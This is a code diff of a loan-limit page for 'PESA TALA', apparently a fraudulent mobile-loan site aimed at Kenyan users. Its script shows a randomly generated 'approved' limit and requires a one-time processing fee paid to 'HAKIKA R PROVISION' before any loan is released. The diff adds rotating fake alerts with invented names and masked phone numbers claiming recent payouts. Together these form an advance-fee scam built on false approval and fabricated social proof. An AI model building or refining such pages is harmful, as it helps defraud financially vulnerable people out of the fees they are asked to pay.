@@ -6,88 +6,86 @@
   <title>Loan Limit - PESA TALA</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gradient-to-br from-purple-900 via-purple-700 to-gray-300 min-h-screen flex items-center justify-center p-4 text-purple-900">
+<body class="bg-gradient-to-tr from-purple-900 via-purple-800 to-gray-200 min-h-screen flex items-center justify-center p-4 text-purple-900">
 
-  <div class="bg-white/90 backdrop-blur-md p-6 rounded-2xl shadow-xl w-full max-w-sm text-center">
-    <img src="pesatala-logo.png" alt="PESA TALA Logo" class="w-16 h-16 mx-auto mb-4 rounded-full shadow-lg">
-    <h2 class="text-xl font-bold mb-2">Your Loan Limit</h2>
-
-    <p class="text-gray-800 mb-2">Hi <span class="font-semibold" id="displayName">User</span>,</p>
+  <div class="w-full max-w-sm bg-white/90 backdrop-blur-md rounded-2xl shadow-2xl p-6 relative text-center">
     
-    <div class="mb-4">
-      <h1 class="text-2xl font-bold text-purple-700" id="loanDisplay">Ksh ...</h1>
-      <input type="range" min="1000" max="4500" step="100" id="loanSlider"
-        class="w-full accent-purple-700 mt-4" onchange="updateLoan(this.value)">
-      <p class="text-xs text-gray-600 mt-1">Adjust your loan below the maximum limit</p>
-    </div>
+    <!-- Rotating Alert Message -->
+    <div id="randomAlert" class="text-sm text-purple-100 mb-3 bg-purple-700 bg-opacity-90 px-4 py-2 rounded-xl shadow-md animate-pulse"></div>
 
-    <p class="text-sm text-gray-700 mb-2">
-      Processing Fee: <span class="font-semibold text-purple-700" id="processingFee">Ksh ...</span>
-    </p>
+    <!-- Logo -->
+    <img src="pesatala-logo.png" alt="PESA TALA Logo" class="w-16 h-16 mx-auto mb-4 rounded-full shadow" />
 
-    <button onclick="showFinalPopup()" class="w-full bg-purple-700 hover:bg-purple-800 text-white py-3 rounded-xl mt-4 transition">
+    <h1 class="text-xl font-bold mb-4">Loan Limit Checker</h1>
+
+    <p class="text-sm mb-2">Hi <span id="userName">User</span>, your approved loan limit is:</p>
+    <h2 id="loanAmount" class="text-3xl font-bold text-purple-700 mb-4">Ksh ...</h2>
+
+    <!-- Range Slider -->
+    <input type="range" id="loanSlider" class="w-full mb-2" min="1000" max="5000" step="100">
+    <p class="text-sm mb-4">Selected Loan Amount: <span id="selectedLoan" class="font-bold">Ksh ...</span></p>
+
+    <!-- Processing Fee -->
+    <p class="text-sm mb-6">Processing Fee: <span id="processingFee" class="font-bold text-purple-700">Ksh ...</span></p>
+
+    <!-- Continue Button -->
+    <button onclick="showPopup()" class="w-full bg-purple-700 hover:bg-purple-800 text-white font-semibold py-3 rounded-xl shadow-lg transition">
       Continue
     </button>
-  </div>
 
-  <!-- Combined Popup Modal -->
-  <div id="popupOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
-    <div class="bg-white text-purple-900 rounded-2xl p-6 w-11/12 max-w-sm text-center shadow-xl relative">
-
-      <!-- Close (X) Button -->
-      <button onclick="closePopup()" class="absolute top-2 right-3 text-gray-500 hover:text-purple-700 text-xl font-bold">&times;</button>
-
-      <h2 class="text-xl font-bold mb-3">✅ Congratulations, <span id="popupName">User</span>!</h2>
-      <p class="text-sm leading-relaxed mb-6">
-        Hi <span id="popupName2">User</span>,<br/>
-        To proceed, <strong>HAKIKA R PROVISION</strong> requires you to make a one-time processing fee payment of 
-        <span class="font-bold text-purple-700" id="popupFee">Ksh ...</span> 
-        for your approved loan of 
-        <span class="font-bold text-purple-700" id="popupLoan">Ksh ...</span> 
-        to your <strong>PESA TALA</strong> account below.
-      </p>
-      <button onclick="goToVerification()" class="bg-purple-700 hover:bg-purple-800 text-white py-2 px-6 rounded-xl shadow-md transition">
-        Proceed to Payment
-      </button>
+    <!-- Popup Modal -->
+    <div id="popupOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+      <div class="bg-white text-purple-900 rounded-2xl p-6 w-11/12 max-w-sm text-center shadow-xl relative">
+        <!-- Close Button -->
+        <button onclick="closePopup()" class="absolute top-2 right-2 text-purple-700 text-xl font-bold">&times;</button>
+        <h2 class="text-xl font-bold mb-2">Hi, <span id="popupUserName">User</span></h2>
+        <p class="text-sm mb-4">
+          To proceed, <strong>HAKIKA R PROVISION</strong> requires you to make a one-time processing fee payment of
+          <span class="font-bold text-purple-700" id="popupFee">Ksh ...</span> for your approved loan of
+          <span class="font-bold text-purple-700" id="popupLoan">Ksh ...</span> to your <strong>PESA TALA</strong> account below.
+        </p>
+        <button onclick="goToVerification()" class="bg-purple-700 hover:bg-purple-800 text-white py-2 px-6 rounded-xl shadow-md transition">
+          Proceed to Payment
+        </button>
+      </div>
     </div>
   </div>
 
   <script>
-    const fullName = localStorage.getItem("fullName") || "User";
-    const shortName = fullName.split(" ")[0];
-    document.getElementById("displayName").textContent = shortName;
+    // Simulated user data
+    const userName = localStorage.getItem("fullName") || "User";
+    document.getElementById("userName").innerText = userName;
 
-    const loanLimit = Math.floor(Math.random() * (4500 - 1800 + 1)) + 1800;
-    let selectedLoan = loanLimit;
-    let processingFee = calcFee(selectedLoan);
+    // Loan limit randomization
+    const minLoan = 1800;
+    const maxLoan = 4500;
+    const loanLimit = Math.floor(Math.random() * (maxLoan - minLoan + 1)) + minLoan;
+    document.getElementById("loanAmount").innerText = "Ksh " + loanLimit.toLocaleString();
 
-    document.getElementById("loanSlider").max = loanLimit;
-    document.getElementById("loanSlider").value = selectedLoan;
-    document.getElementById("loanDisplay").textContent = `Ksh ${selectedLoan.toLocaleString()}`;
-    document.getElementById("processingFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
+    const loanSlider = document.getElementById("loanSlider");
+    const selectedLoan = document.getElementById("selectedLoan");
+    const processingFeeText = document.getElementById("processingFee");
 
-    localStorage.setItem("loanAmount", selectedLoan);
-    localStorage.setItem("processingFee", processingFee);
+    loanSlider.max = loanLimit;
+    loanSlider.value = loanLimit;
 
-    function calcFee(amount) {
-      return Math.round(amount * 0.055);
+    function updateSliderDisplay() {
+      const value = parseInt(loanSlider.value);
+      const fee = Math.round(value * 0.055);
+      selectedLoan.innerText = "Ksh " + value.toLocaleString();
+      processingFeeText.innerText = "Ksh " + fee.toLocaleString();
+
+      // Store for popup
+      document.getElementById("popupLoan").innerText = "Ksh " + value.toLocaleString();
+      document.getElementById("popupFee").innerText = "Ksh " + fee.toLocaleString();
+      document.getElementById("popupUserName").innerText = userName;
     }
 
-    function updateLoan(val) {
-      selectedLoan = parseInt(val);
-      processingFee = calcFee(selectedLoan);
-      document.getElementById("loanDisplay").textContent = `Ksh ${selectedLoan.toLocaleString()}`;
-      document.getElementById("processingFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
-      localStorage.setItem("loanAmount", selectedLoan);
-      localStorage.setItem("processingFee", processingFee);
-    }
+    loanSlider.addEventListener("input", updateSliderDisplay);
+    updateSliderDisplay();
 
-    function showFinalPopup() {
+    function showPopup() {
       document.getElementById("popupOverlay").classList.remove("hidden");
-      document.getElementById("popupName").textContent = shortName;
-      document.getElementById("popupName2").textContent = shortName;
-      document.getElementById("popupLoan").textContent = `Ksh ${selectedLoan.toLocaleString()}`;
-      document.getElementById("popupFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
     }
 
     function closePopup() {
@@ -97,6 +95,25 @@
     function goToVerification() {
       window.location.href = "verification.html";
     }
+
+    // Rotating random alert messages
+    const firstNames = ["Kevin", "Grace", "Brian", "Faith", "James", "Joy", "Daniel", "Mercy", "John", "Alice", "Peter", "Janet"];
+    const prefixes = ["070", "071", "072", "074", "075", "076"];
+
+    function generateRandomAlert() {
+      const name = firstNames[Math.floor(Math.random() * firstNames.length)];
+      const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+      const phone = `${prefix}${Math.floor(100 + Math.random() * 900)}***${Math.floor(1000 + Math.random() * 9000)}`;
+      const amount = Math.floor(1800 + Math.random() * (4500 - 1800 + 1));
+      return `${name} (${phone}) just received Ksh ${amount.toLocaleString()} from PESA TALA`;
+    }
+
+    function rotateAlert() {
+      document.getElementById("randomAlert").innerText = generateRandomAlert();
+    }
+
+    rotateAlert(); // Initial message
+    setInterval(rotateAlert, 3000); // Update every 3s
   </script>
 </body>
 </html>
